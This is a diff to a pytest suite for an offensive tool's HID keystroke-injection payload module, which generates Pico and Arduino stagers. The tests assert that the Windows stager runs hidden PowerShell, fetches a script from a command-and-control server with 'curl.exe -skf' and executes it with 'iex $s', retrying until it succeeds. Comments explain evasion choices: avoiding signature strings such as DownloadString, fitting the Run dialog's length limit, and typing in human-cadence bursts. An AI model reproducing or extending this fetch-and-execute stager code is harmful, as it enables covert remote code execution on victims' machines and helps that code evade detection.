@@ -47,7 +47,11 @@ def _run(arg, tmp_path, name="artefact"):
     from phantom.modules.payload import PayloadModule
     out = os.path.join(str(tmp_path), name)
     with mock.patch("phantom.modules.payload.notifier") as note:
-        PayloadModule().do_hid(f"{arg} --out {out}")
+        # --layout us is PINNED: this suite asserts the exact stager text (its
+        # quoting, its length, its route). The layout is translated per TARGET
+        # and defaults to the bench's locale, so leaving it out would make an
+        # Italian bench see `sh /c` where a US one sees `sh -c`.
+        PayloadModule().do_hid(f"{arg} --layout us --out {out}")
     content = None
     if os.path.isfile(out):
         with open(out, encoding="utf-8") as handle:
@@ -84,11 +88,20 @@ class TestTheTypedCommandIsShort:
                                   resilient=True)
         assert len(short) * 10 < len(inline)
 
-    def test_windows_fetches_with_iwr_and_hides_its_console(self):
+    def test_windows_fetches_with_a_client_measured_to_work_there(self):
+        # `iwr` was measured failing at the SEND stage against the tool's own
+        # listener on Windows 10/11, so the typed text fetches with `curl.exe`
+        # (-k = self-signed C2, -f = an HTTP error is a curl FAILURE so the
+        # loop retries instead of iex-ing an error page). Verified on the
+        # machine: hidden PowerShell + curl + `iex $s` runs the fetched script.
         cmd = ss.hid_download_command("windows", HOST, PORT, token=TOKEN)
         assert cmd.startswith("powershell ")
-        assert "iwr" in cmd          # iwr, not a full Invoke-WebRequest
+        assert "curl.exe -skf" in cmd
+        assert "iex $s" in cmd
         assert "-w h" in cmd         # hidden: no console window on the target
+        # the two literals that are signatures in their own right are GONE
+        assert "DownloadString" not in cmd
+        assert "ServerCertificateValidationCallback" not in cmd
 
     @pytest.mark.parametrize("platform", POSIX)
     def test_posix_fetches_with_curl_and_starts_it_detached(self, platform):
@@ -99,11 +112,28 @@ class TestTheTypedCommandIsShort:
 
     def test_an_over_budget_command_is_refused_not_returned(self):
         # a 700-char host is not a typo we can fix for the operator, so the
-        # refusal names the budget AND the flag that avoids it
+        # refusal names the budget AND the flag that avoids it. Windows has the
+        # TIGHTER budget: the board types into the Run dialog, which truncates
+        # silently at ~260 chars.
         with pytest.raises(ValueError) as excinfo:
             ss.hid_download_command("windows", "h" * 700, PORT, token=TOKEN)
-        assert str(ss.MAX_TYPED_CHARS) in str(excinfo.value)
+        assert str(ss.WIN_RUN_MAX_CHARS) in str(excinfo.value)
         assert "stager-mode inline" in str(excinfo.value)
+
+    @pytest.mark.parametrize("platform", POSIX)
+    def test_posix_keeps_the_larger_budget(self, platform):
+        with pytest.raises(ValueError) as excinfo:
+            ss.hid_download_command(platform, "h" * 700, PORT, token=TOKEN)
+        assert str(ss.MAX_TYPED_CHARS) in str(excinfo.value)
+
+    def test_the_windows_command_fits_the_run_dialog(self):
+        # measured: the Run dialog truncates silently, so "it looks right in
+        # the artefact" is not enough — the length is the contract.
+        cmd = ss.hid_download_command("windows", HOST, PORT, token=TOKEN)
+        assert len(cmd) <= ss.WIN_RUN_MAX_CHARS
+        # dropping the certificate bypass is what made the RETRY LOOP fit:
+        # resilience on the one channel where nobody can retype the command
+        assert "while($i -lt" in cmd and "sleep" in cmd
 
     def test_an_unknown_platform_is_refused(self):
         with pytest.raises(ValueError):
@@ -216,7 +246,7 @@ class TestTheHidCommandDefaultsToDownload:
         content, note = _run("pico --stager windows --type-into windows",
                              tmp_path)
         assert content is not None
-        assert "iwr" in content
+        assert "curl.exe -skf" in content
         assert "/s/windows" in content
         # and NOT the 11.4k inline launcher
         assert " -Enc " not in content
@@ -243,11 +273,12 @@ class TestTheHidCommandDefaultsToDownload:
             self, tmp_path):
         content, _ = _run("arduino --stager linux --type-into linux", tmp_path)
         assert content is not None
-        line = next(ln for ln in content.splitlines()
-                    if "Keyboard.print(F(" in ln)
-        body = line.split('Keyboard.print(F("', 1)[1]
-        body = body[:body.rindex('"));')]
-        typed = body.replace('\\"', '"').replace("\\\\", "\\")
+        # the command is typed in BURSTS (human cadence), so the typed text is
+        # every Keyboard.print line joined — not one line
+        chunks = [ln.split('Keyboard.print(F("', 1)[1].rsplit('"));', 1)[0]
+                  for ln in content.splitlines() if "Keyboard.print(F(" in ln]
+        assert chunks
+        typed = "".join(chunks).replace('\\"', '"').replace("\\\\", "\\")
         assert len(typed) < LEGACY_LIMIT
         assert typed.startswith("sh -c ")
 
